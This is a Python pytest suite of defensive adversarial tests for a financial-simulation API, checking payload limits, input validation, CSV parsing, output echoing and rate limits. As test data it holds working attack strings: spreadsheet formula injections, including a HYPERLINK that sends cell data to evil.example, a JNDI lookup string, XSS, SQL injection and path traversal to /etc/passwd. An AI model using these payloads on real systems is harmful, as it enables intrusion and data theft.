"""Adversarial and abuse tests for the RoundUp API v1, written only from API.md.

Where the contract is ambiguous the test accepts the reasonable range of outcomes;
each such place is listed in ATTACKS.md. In every case a 500 or a leaked stack
trace is a failure.
"""
from __future__ import annotations

import json
import time
import uuid
from datetime import timedelta

import jwt
import pytest

from apisupport import (
    DESC_MARKER, DROP, ISSUER, SCRIPT_MARKER, FakeStorage, assert_error, assert_no_leak, b64u,
    claims, compare_body, default_run, hs256_token, make_app, make_client, make_txs, mapping,
    minimal_txs, parse_body, post_raw, raw_token, saved_body, sign, sim_body,
)

LIMIT = 3_000_000
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠")


def not_500(r):
    assert r.status_code < 500 or r.status_code == 503, f"server error {r.status_code}: {r.text[:300]}"
    assert r.headers.get("x-request-id")
    assert_no_leak(r.text)


# ================================================================ body size

def _padded_simulate(run, total: int) -> bytes:
    base = json.dumps(sim_body(run)).encode()
    assert len(base) < total
    return base + b" " * (total - len(base))  # trailing JSON whitespace is legal


def test_body_exactly_at_limit_is_accepted(client, run):
    r = post_raw(client, "/v1/simulate", _padded_simulate(run, LIMIT))
    assert r.status_code == 200, r.text[:300]


def test_body_one_byte_over_limit_is_413(client, run):
    assert_error(post_raw(client, "/v1/simulate", _padded_simulate(run, LIMIT + 1)), 413, "PAYLOAD_TOO_LARGE")


@pytest.mark.parametrize("path", ["/v1/simulate", "/v1/compare", "/v1/transactions/parse", "/v1/saved"])
def test_oversize_invalid_json_is_413_not_400(client, path):
    """Size is checked before parsing, so garbage that is too large is 413."""
    body = b"{" + b"x" * (LIMIT + 10)
    r = post_raw(client, path, body)
    if path == "/v1/saved":
        # Ambiguity: auth vs size check order for the save endpoint.
        assert_error(r, {401, 413}, codes={"PAYLOAD_TOO_LARGE", "AUTH_REQUIRED"})
    else:
        assert_error(r, 413, "PAYLOAD_TOO_LARGE")


def test_oversize_without_content_length_chunked(client, run):
    payload = _padded_simulate(run, LIMIT + 50_000)

    def gen():
        for i in range(0, len(payload), 65536):
            yield payload[i:i + 65536]

    r = client.post("/v1/simulate", content=gen(), headers={"Content-Type": "application/json"})
    assert_error(r, 413, "PAYLOAD_TOO_LARGE")


def test_oversize_with_lying_small_content_length(client, run):
    payload = _padded_simulate(run, LIMIT + 50_000)
    r = client.post("/v1/simulate", content=payload,
                    headers={"Content-Type": "application/json", "Content-Length": "100"})
    # Ambiguity: a server may 413 on the real byte count or 400 on the mismatch.
    assert_error(r, {400, 413}, codes={"PAYLOAD_TOO_LARGE", "INVALID_JSON"})


def test_oversize_with_huge_declared_content_length(client):
    r = client.post("/v1/simulate", content=b"{}",
                    headers={"Content-Type": "application/json", "Content-Length": str(LIMIT + 1)})
    # Declared length over the limit should be refused without reading; a server that
    # reads the real two bytes may answer 400/422 instead.
    not_500(r)
    assert r.status_code in (400, 413, 422)


def test_oversize_via_many_long_descriptions(client, run):
    d = (run.start + timedelta(days=3)).isoformat()
    txs = [{"posted_date": d, "amount": "1.00", "direction": "debit", "description": "D" * 140}
           for _ in range(19_000)]
    body = json.dumps(sim_body(run, txs=txs)).encode()
    assert len(body) > LIMIT
    assert_error(post_raw(client, "/v1/simulate", body), 413, "PAYLOAD_TOO_LARGE")


def test_too_many_transactions(client, run):
    body = sim_body(run, txs=minimal_txs(run.start, 20_001))
    assert len(json.dumps(body)) < LIMIT
    err = assert_error(client.post("/v1/simulate", json=body), 422, "INVALID_INPUT")
    assert "transactions" in err["fields"]


def test_too_many_transactions_compare(client, run):
    body = compare_body(run, txs=minimal_txs(run.start, 20_001))
    assert_error(client.post("/v1/compare", json=body), 422, "INVALID_INPUT")


# ================================================================ JSON structure

@pytest.mark.parametrize("raw", ["[]", '"string"', "1", "null", "true", "[{}]", "", "   ", "{", "{'a': 1}",
                                 '{"a":1,}', "\x00", '{"a": 1} {"b": 2}'])
@pytest.mark.parametrize("path", ["/v1/simulate", "/v1/compare", "/v1/transactions/parse"])
def test_not_a_json_object(client, path, raw):
    assert_error(post_raw(client, path, raw), 400, "INVALID_JSON")


def test_invalid_utf8_body(client):
    r = post_raw(client, "/v1/transactions/parse", b'{"csv": "\xff\xfe\xfa", "mapping": {}}')
    assert_error(r, {400, 422}, codes={"INVALID_JSON", "INVALID_INPUT", "CSV_INVALID"})


def test_utf8_bom_body(client, run):
    r = post_raw(client, "/v1/simulate", b"\xef\xbb\xbf" + json.dumps(sim_body(run)).encode())
    not_500(r)
    assert r.status_code in (200, 400)


@pytest.mark.parametrize("depth", [1_000, 100_000])
def test_deeply_nested_arrays(client, run, depth):
    body = json.dumps(sim_body(run))[:-1] + ', "transactions_x": ' + "[" * depth + "]" * depth + "}"
    r = post_raw(client, "/v1/simulate", body)
    assert_error(r, {400, 422}, codes={"INVALID_JSON", "UNKNOWN_FIELD", "INVALID_INPUT"})


@pytest.mark.parametrize("depth", [1_000, 100_000])
def test_deeply_nested_objects_in_known_field(client, run, depth):
    body = sim_body(run)
    body.pop("transactions")
    raw = json.dumps(body)[:-1] + ', "transactions": [' + '{"a":' * depth + "1" + "}" * depth + "]}"
    r = post_raw(client, "/v1/simulate", raw)
    assert_error(r, {400, 422}, codes={"INVALID_JSON", "UNKNOWN_FIELD", "INVALID_INPUT"})


# ================================================================ unknown fields

@pytest.mark.parametrize("where", ["top", "transaction", "generate", "compare_a", "mapping", "parse_top", "saved_top"])
def test_unknown_fields_rejected_at_every_level(keys, client, run, where):
    headers = {}
    if where == "top":
        path, body, expect = "/v1/simulate", sim_body(run), "foo"
        body["foo"] = 1
    elif where == "transaction":
        path, body, expect = "/v1/simulate", sim_body(run), "transactions.0.foo"
        body["transactions"][0]["foo"] = "bar"
    elif where == "generate":
        path, body, expect = "/v1/simulate", sim_body(run, generate={"seed": 1, "max_per_day": 1}), "generate.foo"
        body["generate"]["foo"] = 1
    elif where == "compare_a":
        path, body, expect = "/v1/compare", compare_body(run), "a.foo"
        body["a"]["foo"] = True
    elif where == "mapping":
        path, body, expect = "/v1/transactions/parse", parse_body("Date,Amount\n2024-01-03,1\n"), "mapping.foo"
        body["mapping"]["foo"] = "Amount"
    elif where == "parse_top":
        path, body, expect = "/v1/transactions/parse", parse_body("Date,Amount\n2024-01-03,1\n"), "foo"
        body["foo"] = None
    else:
        path, body, expect = "/v1/saved", saved_body(run), "foo"
        body["foo"] = "x"
        headers = {"Authorization": f"Bearer {sign(keys, claims())}"}
    err = assert_error(client.post(path, json=body, headers=headers), 422, "UNKNOWN_FIELD")
    parent = expect.rsplit(".", 1)[0] if "." in expect else ""
    assert expect in err["fields"] or (parent and parent in err["fields"]), err["fields"]


def test_unknown_field_with_engine_looking_names(client, run):
    """Fields that look like internal engine config must not be smuggled through."""
    for name in ("config", "threshold", "fee", "market", "series", "__proto__", "constructor"):
        body = sim_body(run)
        body[name] = {"x": 1}
        assert_error(client.post("/v1/simulate", json=body), 422, "UNKNOWN_FIELD")


# ================================================================ strict types

@pytest.mark.parametrize("raw_amount", ["4.37", "4", "0", "1e2", "-4.37"])
def test_amount_as_json_number_rejected(client, run, raw_amount):
    body = sim_body(run, txs=make_txs(run.start, n=1))
    raw = json.dumps(body).replace('"amount": "4.37"', f'"amount": {raw_amount}')
    assert f'"amount": {raw_amount}' in raw
    err = assert_error(post_raw(client, "/v1/simulate", raw), 422, "INVALID_INPUT")
    assert "transactions.0.amount" in err["fields"]


@pytest.mark.parametrize("amount", [
    "4.375", "-4.37", "+4.37", " 4.37", "4.37 ", "4.37\n", "4,37", "4.", ".37", "1e3", "12345678",
    "0x10", "NaN", "Infinity", "", "4.3.7", "４.３７", "٤.٣٧", "4\u200b.37", "1_000",
    "4.37; DROP TABLE app.scenarios;--",
])
def test_bad_amount_strings(client, run, amount):
    txs = make_txs(run.start, n=1)
    txs[0]["amount"] = amount
    err = assert_error(client.post("/v1/simulate", json=sim_body(run, txs=txs)), 422, "INVALID_INPUT")
    assert "transactions.0.amount" in err["fields"]


@pytest.mark.parametrize("value", ["true", "false", 1, 0, None, "yes", [True]])
def test_reinvest_must_be_boolean(client, run, value):
    body = sim_body(run)
    body["reinvest"] = value
    err = assert_error(client.post("/v1/simulate", json=body), 422, "INVALID_INPUT")
    assert "reinvest" in err["fields"]


@pytest.mark.parametrize("raw_seed", ['"5"', "5.0", "5.5", "1e3", "true", "false", "null", "[5]", '"0x5"'])
def test_seed_must_be_integer(client, run, raw_seed):
    body = sim_body(run, generate={"seed": 123456, "max_per_day": 1})
    raw = json.dumps(body).replace('"seed": 123456', f'"seed": {raw_seed}')
    err = assert_error(post_raw(client, "/v1/simulate", raw), 422, "INVALID_INPUT")
    assert "generate.seed" in err["fields"]


@pytest.mark.parametrize("raw_mpd", ['"2"', "2.0", "true"])
def test_max_per_day_must_be_integer(client, run, raw_mpd):
    body = sim_body(run, generate={"seed": 1, "max_per_day": 2})
    raw = json.dumps(body).replace('"max_per_day": 2', f'"max_per_day": {raw_mpd}')
    assert_error(post_raw(client, "/v1/simulate", raw), 422, "INVALID_INPUT")


@pytest.mark.parametrize("field,value", [
    ("posted_date", "2024-1-3"), ("posted_date", "2023-02-29"), ("posted_date", "20240103"),
    ("posted_date", "2024-01-03T00:00:00"), ("posted_date", "03/01/2024"), ("posted_date", 20240103),
    ("posted_date", "２０２４-01-03"), ("posted_date", ""), ("direction", True), ("description", 12345),
    ("status", None), ("category", ["purchase"]),
])
def test_bad_transaction_field_types(client, run, field, value):
    txs = make_txs(run.start, n=1)
    txs[0][field] = value
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    if field in ("status", "category") and value is None:
        # Ambiguity: explicit null for an optional field.
        not_500(r)
        assert r.status_code in (200, 422)
        return
    err = assert_error(r, 422, "INVALID_INPUT")
    assert f"transactions.0.{field}" in err["fields"]


@pytest.mark.parametrize("field,value", [("start", "2015-1-2"), ("end", 2020), ("start", None),
                                         ("scenario_id", 1101), ("style", None), ("transactions", {}),
                                         ("transactions", "[]"), ("generate", [1, 1])])
def test_bad_run_option_types(client, run, field, value):
    body = sim_body(run)
    body[field] = value
    if field == "generate":
        body.pop("transactions")
    err = assert_error(client.post("/v1/simulate", json=body), 422, "INVALID_INPUT")
    assert field in err["fields"]


@pytest.mark.parametrize("token", ["NaN", "Infinity", "-Infinity"])
def test_nan_infinity_tokens(client, run, token):
    body = sim_body(run, generate={"seed": 77, "max_per_day": 1})
    raw = json.dumps(body).replace('"seed": 77', f'"seed": {token}')
    assert_error(post_raw(client, "/v1/simulate", raw), {400, 422}, codes={"INVALID_JSON", "INVALID_INPUT"})
    body = sim_body(run, txs=make_txs(run.start, n=1))
    raw = json.dumps(body).replace('"amount": "4.37"', f'"amount": {token}')
    assert_error(post_raw(client, "/v1/simulate", raw), {400, 422}, codes={"INVALID_JSON", "INVALID_INPUT"})


def test_duplicate_keys(client, run):
    raw = json.dumps(sim_body(run))[:-1] + ', "reinvest": "not-a-bool"}'
    r = post_raw(client, "/v1/simulate", raw)
    # Ambiguity: the contract is silent; must not be 500 and must not silently take
    # a non-boolean value.
    not_500(r)
    assert r.status_code in (400, 422)
    raw2 = json.dumps(sim_body(run))[:-1] + ', "reinvest": false}'
    r2 = post_raw(client, "/v1/simulate", raw2)
    not_500(r2)
    assert r2.status_code in (200, 400, 422)


def test_huge_integer_seed(client, run):
    body = sim_body(run, generate={"seed": 1, "max_per_day": 1})
    raw = json.dumps(body).replace('"seed": 1,', '"seed": ' + "9" * 5000 + ",")
    r = post_raw(client, "/v1/simulate", raw)
    assert_error(r, {400, 422}, codes={"INVALID_JSON", "INVALID_INPUT"})


# ================================================================ content type

@pytest.mark.parametrize("ctype", [None, "text/plain", "application/x-www-form-urlencoded",
                                   "multipart/form-data; boundary=xyz", "text/csv", "application/xml",
                                   "application/jsonx", "json", "application/javascript"])
@pytest.mark.parametrize("path", ["/v1/simulate", "/v1/compare", "/v1/transactions/parse", "/v1/saved"])
def test_wrong_content_type(client, run, path, ctype):
    r = post_raw(client, path, json.dumps(sim_body(run)), content_type=ctype)
    if path == "/v1/saved":
        assert_error(r, {401, 415}, codes={"UNSUPPORTED_MEDIA_TYPE", "AUTH_REQUIRED"})
    else:
        assert_error(r, 415, "UNSUPPORTED_MEDIA_TYPE")


@pytest.mark.parametrize("ctype", ["application/json; charset=utf-8", "Application/JSON"])
def test_json_content_type_variants(client, run, ctype):
    r = post_raw(client, "/v1/simulate", json.dumps(sim_body(run)), content_type=ctype)
    not_500(r)
    # Ambiguity: parameters / case are not addressed by the contract; accepting them is reasonable.
    assert r.status_code in (200, 415)


def test_multipart_csv_upload_refused(client):
    r = client.post("/v1/transactions/parse", files={"file": ("a.csv", b"Date,Amount\n2024-01-03,1\n", "text/csv")})
    assert_error(r, 415, "UNSUPPORTED_MEDIA_TYPE")


# ================================================================ CSV attacks

def _parse(client, body):
    return client.post("/v1/transactions/parse", json=body)


def test_csv_with_nul_bytes(client):
    r = _parse(client, parse_body("Date,Amount,Description\n2024-01-03,4.37,CO\x00FFEE\n"))
    assert_error(r, 422, "CSV_INVALID")


def test_csv_nul_in_header(client):
    r = _parse(client, parse_body("Da\x00te,Amount,Description\n2024-01-03,4.37,X\n", date="Da\x00te"))
    assert_error(r, 422, "CSV_INVALID")


def test_csv_binary_data(client):
    junk = bytes(range(1, 256)).decode("latin-1") * 50
    assert_error(_parse(client, parse_body(junk)), 422, "CSV_INVALID")


def test_csv_looks_like_zip_or_xlsx(client):
    junk = "PK\x03\x04\x14\x00\x06\x00" + "\x01\x02\x03\x7f" * 200
    assert_error(_parse(client, parse_body(junk)), 422, "CSV_INVALID")


def test_csv_unterminated_quote(client):
    r = _parse(client, parse_body('Date,Amount,Description\n2024-01-03,4.37,"COFFEE\n2024-01-04,1.00,TEA\n'))
    assert_error(r, 422, "CSV_INVALID")


def test_csv_stray_quote_in_unquoted_field(client):
    r = _parse(client, parse_body('Date,Amount,Description\n2024-01-03,4.37,COF"FEE"X\n'))
    not_500(r)
    assert r.status_code in (200, 422)
    if r.status_code == 422:
        assert_error(r, 422, "CSV_INVALID")
    else:
        assert "COF" not in r.text


@pytest.mark.parametrize("csv_text", ["", "\n", "Date,Amount,Description\n", "   "])
def test_csv_empty_or_header_only(client, csv_text):
    r = _parse(client, parse_body(csv_text))
    not_500(r)
    assert r.status_code in (200, 422)
    if r.status_code == 200:
        assert r.json()["summary"]["rows"] == 0


def test_csv_ragged_rows(client):
    r = _parse(client, parse_body("Date,Amount,Description\n2024-01-03,4.37\n2024-01-04,1.00,A,EXTRA,MORE\n"))
    not_500(r)
    assert r.status_code in (200, 422)


def test_csv_20001_rows_rejected(client):
    rows = "".join("2024-01-03,1.00,X\n" for _ in range(20_001))
    csv_text = "Date,Amount,Description\n" + rows
    assert len(csv_text) < 2_000_000
    assert_error(_parse(client, parse_body(csv_text)), 422, "CSV_INVALID")


def test_csv_20000_rows_accepted(client):
    rows = "".join(f"2024-01-{(i % 28) + 1:02d},{(i % 900) + 1}.{i % 100:02d},X{i}\n" for i in range(20_000))
    r = _parse(client, parse_body("Date,Amount,Description\n" + rows, sign_convention="debits_positive"))
    assert r.status_code == 200, r.text[:300]
    assert r.json()["summary"]["rows"] == 20_000


def test_csv_blank_lines_do_not_bypass_row_limit(client):
    rows = "".join("2024-01-03,1.00,X\n\n" for _ in range(20_001))
    r = _parse(client, parse_body("Date,Amount,Description\n" + rows))
    assert_error(r, 422, "CSV_INVALID")


def test_csv_over_2m_characters(client):
    csv_text = "Date,Amount,Description\n2024-01-03,1.00," + "A" * 2_000_001 + "\n"
    r = _parse(client, parse_body(csv_text))
    # Ambiguity: which code a too-long csv string gets.
    err = assert_error(r, 422, codes={"INVALID_INPUT", "CSV_INVALID"})
    if err["code"] == "INVALID_INPUT":
        assert "csv" in err["fields"]
    assert "AAAAAAAAAA" not in r.text


def test_csv_char_limit_counts_characters_not_bytes(client):
    # 1,900,000 three-byte characters = 5.7 MB of UTF-8: under the char limit but over the body limit.
    csv_text = "Date,Amount,Description\n2024-01-03,1.00," + "€" * 1_900_000 + "\n"
    r = _parse(client, parse_body(csv_text))
    assert_error(r, 413, "PAYLOAD_TOO_LARGE")


def test_csv_extremely_long_cell_not_echoed(client):
    marker = DESC_MARKER + "L" * 1_000_000
    r = _parse(client, parse_body(f"Date,Amount,Description\n2024-01-03,4.37,{marker}\n"))
    not_500(r)
    assert r.status_code in (200, 422)
    assert DESC_MARKER not in r.text
    assert len(r.content) < 100_000


def test_csv_column_name_over_100_chars(client):
    long_col = "C" * 101
    r = _parse(client, parse_body(f"Date,Amount,Description,{long_col}\n2024-01-03,4.37,X,y\n"))
    not_500(r)
    assert r.status_code in (200, 422)
    if r.status_code == 200:
        assert all(len(c) <= 101 for c in r.json()["columns"])
    else:
        assert_error(r, 422, codes={"CSV_INVALID", "INVALID_INPUT"})


def test_mapping_column_name_over_100_chars(client):
    long_col = "C" * 101
    r = _parse(client, parse_body(f"{long_col},Amount\n2024-01-03,4.37\n", date=long_col, amount="Amount"))
    err = assert_error(r, 422, codes={"INVALID_INPUT", "CSV_INVALID"})
    if err["code"] == "INVALID_INPUT":
        assert "mapping.date" in err["fields"]


@pytest.mark.parametrize("value", [1, True, ["Date"], {"col": "Date"}])
def test_mapping_values_must_be_strings_or_null(client, value):
    body = parse_body("Date,Amount\n2024-01-03,1\n", date="Date", amount="Amount")
    body["mapping"]["description"] = value
    err = assert_error(_parse(client, body), 422, "INVALID_INPUT")
    assert "mapping.description" in err["fields"]


@pytest.mark.parametrize("csv_value", [None, 123, ["a,b"], {"a": 1}, True])
def test_csv_must_be_string(client, csv_value):
    body = parse_body("x")
    body["csv"] = csv_value
    err = assert_error(_parse(client, body), 422, "INVALID_INPUT")
    assert "csv" in err["fields"]


FORMULA_HEADERS = [
    "=cmd|' /C calc'!A0", "+1", "-1", "@SUM(A1:A2)", "\t=1+1", "\r=1+1", "\n=1+1", "＝HYPERLINK(\"x\")",
    "＋1", "－1", "＠SUM(1)", "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")", "=1+1;DROP TABLE x",
]


@pytest.mark.parametrize("header", FORMULA_HEADERS)
def test_formula_injection_header_echo_is_neutralised(client, header):
    quoted = '"' + header.replace('"', '""') + '"'
    csv_text = f"Date,Amount,Description,{quoted}\n2024-01-03,4.37,COFFEE,x\n"
    r = _parse(client, parse_body(csv_text))
    not_500(r)
    if r.status_code != 200:
        assert_error(r, 422, "CSV_INVALID")
        assert header not in r.text
        return
    b = r.json()
    for c in b["columns"] + [b["date_column_used"]]:
        assert not c.startswith(FORMULA_PREFIXES), f"unneutralised echo {c!r}"
    if any(c.lstrip("'") == header for c in b["columns"]):
        assert "'" + header in b["columns"]


@pytest.mark.parametrize("header", ["=cmd|' /C calc'!A0", "@SUM(A1)", "＝1", "-Date", "+Date"])
def test_formula_injection_in_mapped_date_column(client, header):
    quoted = '"' + header.replace('"', '""') + '"'
    csv_text = f"{quoted},Amount,Description\n2024-01-03,4.37,COFFEE\n"
    r = _parse(client, parse_body(csv_text, date=header, amount="Amount", description="Description"))
    assert r.status_code == 200, r.text
    assert r.json()["date_column_used"] == "'" + header


@pytest.mark.parametrize("cell", ["=cmd|' /C calc'!A0", "+1", "-1", "@SUM(A1)", "\t=1", "＝1",
                                  "=HYPERLINK(\"http://evil.example\")"])
def test_formula_injection_cells(client, cell):
    quoted = '"' + cell.replace('"', '""') + '"'
    # In the description column: never echoed.
    r = _parse(client, parse_body(f"Date,Amount,Description\n2024-01-03,4.37,{quoted}\n"))
    assert r.status_code == 200
    if len(cell.strip()) > 3:
        assert cell.strip() not in r.text
    assert not any(isinstance(v, str) and v.startswith(FORMULA_PREFIXES)
                   for t in r.json()["transactions"] for v in t.values())
    # In the amount and date columns: either a problem row or a normalised value, never echoed raw.
    r = _parse(client, parse_body(f"Date,Amount,Description\n2024-01-03,{quoted},X\n{quoted},4.37,Y\n",
                                  sign_convention="debits_positive"))
    not_500(r)
    assert r.status_code in (200, 422)
    if r.status_code == 200:
        for t in r.json()["transactions"]:
            for v in t.values():
                assert not (isinstance(v, str) and v.startswith(FORMULA_PREFIXES)), t


def test_formula_injection_in_missing_mapping_error_not_echoed(client):
    r = _parse(client, parse_body("Date,Amount\n2024-01-03,1\n", date="=cmd|' /C calc'!A0", amount="Amount"))
    assert_error(r, 422, "CSV_INVALID")
    assert "=cmd" not in r.text


def test_account_number_like_values_not_echoed(client):
    csv_text = ("Date,Amount,Description,Account\n2024-01-03,4.37,CARD 4111111111111111,GB29NWBK60161331926819\n")
    r = _parse(client, parse_body(csv_text, date="Date", amount="Amount", description="Description", account="Account"))
    not_500(r)
    assert "4111111111111111" not in r.text
    assert "GB29NWBK60161331926819" not in r.text


def test_csv_with_utf8_bom_header(client):
    r = _parse(client, parse_body("\ufeffDate,Amount,Description\n2024-01-03,4.37,X\n"))
    not_500(r)
    assert r.status_code in (200, 422)
    if r.status_code == 200:
        assert r.json()["date_column_used"] in ("Date", "\ufeffDate")


def test_csv_multiline_quoted_field_row_numbers(client):
    csv_text = 'Date,Amount,Description\n2024-01-03,4.37,"LINE1\nLINE2"\n2024-01-04,1.00,X\n'
    r = _parse(client, parse_body(csv_text))
    assert r.status_code == 200, r.text
    rows = [t["row"] for t in r.json()["transactions"]]
    assert rows[0] == 2
    assert rows[1] in (3, 4)  # Ambiguity: physical line vs record number
    assert "LINE1" not in r.text


# ================================================================ echo / XSS / injection

@pytest.mark.parametrize("payload", [
    SCRIPT_MARKER, "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>", "javascript:alert(1)",
    "{{7*7}}", "${jndi:ldap://evil.example/a}", "'; DROP TABLE app.scenarios; --", "' OR '1'='1",
])
def test_description_payloads_never_echoed(client, run, payload):
    txs = make_txs(run.start, n=2, description=DESC_MARKER + payload)
    for path, body in (("/v1/simulate", sim_body(run, txs=txs)), ("/v1/compare", compare_body(run, txs=txs))):
        r = client.post(path, json=body)
        assert r.status_code == 200, r.text
        assert DESC_MARKER not in r.text
        assert payload not in r.text


def test_description_not_echoed_in_validation_error(client, run):
    txs = make_txs(run.start, n=1, description=DESC_MARKER + SCRIPT_MARKER + "x" * 200)
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    assert_error(r, 422, "INVALID_INPUT")
    assert DESC_MARKER not in r.text and "<script" not in r.text


def test_description_not_echoed_when_other_field_invalid(client, run):
    txs = make_txs(run.start, n=1, description=DESC_MARKER)
    txs[0]["amount"] = "bad"
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    assert_error(r, 422, "INVALID_INPUT")
    assert DESC_MARKER not in r.text


def test_description_not_echoed_when_wrong_type(client, run):
    txs = make_txs(run.start, n=1)
    txs[0]["description"] = {"x": DESC_MARKER}
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    assert_error(r, 422, "INVALID_INPUT")
    assert DESC_MARKER not in r.text


def test_huge_description_rejected_not_echoed(client, run):
    txs = make_txs(run.start, n=1, description=DESC_MARKER + "Z" * 1_000_000)
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    assert_error(r, 422, "INVALID_INPUT")
    assert DESC_MARKER not in r.text and len(r.content) < 10_000


@pytest.mark.parametrize("sid", [
    "../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "steady-growth/../dividend", "/etc/passwd",
    "steady-growth\x00", "STEADY-GROWTH", " steady-growth", "steady-growth ", "steady_growth",
    "steady-growth' OR '1'='1", "steady-growth; DROP TABLE x", "C:\\Windows\\win.ini", "%00",
    "constructor", "__proto__", "__init__", "", "s" * 100_000,
])
def test_hostile_scenario_ids(client, run, sid):
    body = sim_body(run)
    body["scenario_id"] = sid
    r = client.post("/v1/simulate", json=body)
    # Ambiguity: an unknown id is 404 UNKNOWN_SCENARIO; a server may first reject an
    # ill-formed id as 422 INVALID_INPUT.
    assert_error(r, {404, 422}, codes={"UNKNOWN_SCENARIO", "INVALID_INPUT"})
    assert "root:" not in r.text and "[fonts]" not in r.text
    assert len(r.content) < 10_000


@pytest.mark.parametrize("style", ["../broad", "BROAD", "broad\x00", "dividend' --", "*", ""])
def test_hostile_styles(client, run, style):
    body = sim_body(run)
    body["style"] = style
    assert_error(client.post("/v1/simulate", json=body), {404, 422}, codes={"UNKNOWN_SCENARIO", "INVALID_INPUT"})


@pytest.mark.parametrize("path", ["/v1/scenarios/..%2f..%2fetc%2fpasswd", "/v1/%2e%2e/%2e%2e/etc/passwd",
                                  "/v1/scenarios/steady-growth", "/v1//health/..", "/v1/health%00"])
def test_hostile_paths(client, path):
    r = client.get(path)
    not_500(r)
    assert r.status_code in (200, 404, 405)
    assert "root:" not in r.text


# ================================================================ unicode

@pytest.mark.parametrize("desc", [
    "\u202eEFFOC", "COF\u200bFEE", "😀" * 10, "e\u0301" * 20, "\ufeffCOFFEE", "\u0000",
    "𝕮𝖔𝖋𝖋𝖊𝖊", "ﷺ" * 5, "\u2028\u2029",
])
def test_unicode_descriptions(client, run, desc):
    txs = make_txs(run.start, n=1, description=desc)
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    not_500(r)
    assert r.status_code in (200, 422)
    if desc not in ("\u0000",) and r.status_code == 200:
        assert desc not in r.text


def test_lone_surrogate_in_description(client, run):
    raw = json.dumps(sim_body(run, txs=make_txs(run.start, n=1, description="PLACEHOLDER")))
    raw = raw.replace("PLACEHOLDER", "\\ud800abc")
    r = post_raw(client, "/v1/simulate", raw)
    not_500(r)
    assert r.status_code in (200, 400, 422)


def test_description_length_counts_code_points(client, run):
    txs = make_txs(run.start, n=1, description="😀" * 140)
    r = client.post("/v1/simulate", json=sim_body(run, txs=txs))
    not_500(r)
    # Ambiguity: "characters" = code points (200) vs UTF-16 units / bytes (422).
    assert r.status_code in (200, 422)
    txs = make_txs(run.start, n=1, description="😀" * 141)
    assert_error(client.post("/v1/simulate", json=sim_body(run, txs=txs)), 422, "INVALID_INPUT")


def test_unicode_name_in_saved(keys, client, storage, run):
    r = client.post("/v1/saved", json=saved_body(run, name="💰" * 80),
                    headers={"Authorization": f"Bearer {sign(keys, claims())}"})
    not_500(r)
    assert r.status_code in (201, 422)


def test_unicode_csv_headers(client):
    r = _parse(client, parse_body("Fecha,Importe,Descripción\n2024-01-03,4.37,CAFÉ\n",
                                  date="Fecha", amount="Importe", description="Descripción"))
    assert r.status_code == 200
    assert r.json()["columns"] == ["Fecha", "Importe", "Descripción"]
    assert "CAFÉ" not in r.text


# ================================================================ rate limits

def _limited_client(keys, limits, storage=None):
    return make_client(make_app(keys=keys, storage=storage or FakeStorage(), rate_limits=limits))


def _exhaust(send, limit):
    for i in range(limit):
        r = send()
        assert r.status_code != 429, f"request {i + 1} of {limit} was rate limited"
    last = None
    for _ in range(limit + 1):  # tolerate a fixed window rolling over once
        last = send()
        if last.status_code == 429:
            break
    err = assert_error(last, 429, "RATE_LIMITED")
    ra = last.headers.get("retry-after")
    assert ra is not None and ra.strip().isdigit() and 0 < int(ra) <= 60, ra
    return err


def test_rate_limit_simulate_override(keys):
    with _limited_client(keys, {"simulate": 3}) as c:
        run = default_run(c)
        body = sim_body(run, txs=make_txs(run.start, n=1))
        _exhaust(lambda: c.post("/v1/simulate", json=body), 3)
        # other routes unaffected
        assert c.get("/v1/health").status_code == 200
        # Ambiguity: simulate and compare share one bullet ("30") but have separate override keys.
        assert c.post("/v1/compare", json=compare_body(run)).status_code in (200, 429)


def test_rate_limit_compare_override(keys):
    with _limited_client(keys, {"compare": 2}) as c:
        run = default_run(c)
        _exhaust(lambda: c.post("/v1/compare", json=compare_body(run)), 2)
        assert c.post("/v1/simulate", json=sim_body(run)).status_code in (200, 429)  # see ATTACKS.md
        assert c.get("/v1/scenarios").status_code == 200


def test_rate_limit_parse_override(keys):
    with _limited_client(keys, {"parse": 2}) as c:
        _exhaust(lambda: c.post("/v1/transactions/parse",
                                json=parse_body("Date,Amount,Description\n2024-01-03,4.37,X\n")), 2)


def test_rate_limit_read_override(keys):
    with _limited_client(keys, {"read": 3}) as c:
        _exhaust(lambda: c.get("/v1/assumptions"), 3)


def test_rate_limit_saved_override(keys):
    storage = FakeStorage()
    with _limited_client(keys, {"saved": 2}, storage) as c:
        run = default_run(c)
        tok = sign(keys, claims())
        _exhaust(lambda: c.post("/v1/saved", json=saved_body(run), headers={"Authorization": f"Bearer {tok}"}), 2)
        assert len(storage.calls) == 4  # two successful saves only, nothing written once limited


def test_rate_limit_default_parse_is_10(keys):
    with make_client(make_app(keys=keys, rate_limits=None)) as c:
        _exhaust(lambda: c.post("/v1/transactions/parse",
                                json=parse_body("Date,Amount,Description\n2024-01-03,4.37,X\n")), 10)


def test_rate_limit_default_simulate_is_30(keys):
    with make_client(make_app(keys=keys, rate_limits=None)) as c:
        run = default_run(c)
        body = sim_body(run, txs=make_txs(run.start, n=1))
        _exhaust(lambda: c.post("/v1/simulate", json=body), 30)


def test_rate_limit_not_bypassed_by_request_id_or_invalid_bodies(keys):
    with _limited_client(keys, {"simulate": 3}) as c:
        run = default_run(c)
        body = sim_body(run)
        for i in range(3):
            c.post("/v1/simulate", json=body, headers={"X-Request-ID": str(uuid.uuid4())})
        r = c.post("/v1/simulate", json=body, headers={"X-Request-ID": "fresh"})
        assert_error(r, 429, "RATE_LIMITED")


def test_rate_limit_state_is_per_app_instance(keys):
    with _limited_client(keys, {"read": 1}) as c1:
        c1.get("/v1/scenarios")
        assert c1.get("/v1/scenarios").status_code == 429
    with _limited_client(keys, {"read": 1}) as c2:
        assert c2.get("/v1/scenarios").status_code == 200


# ================================================================ auth attacks

def _hdr(token):
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def auth_env(keys):
    storage = FakeStorage()
    with make_client(make_app(keys=keys, storage=storage)) as c:
        yield c, storage, default_run(c)


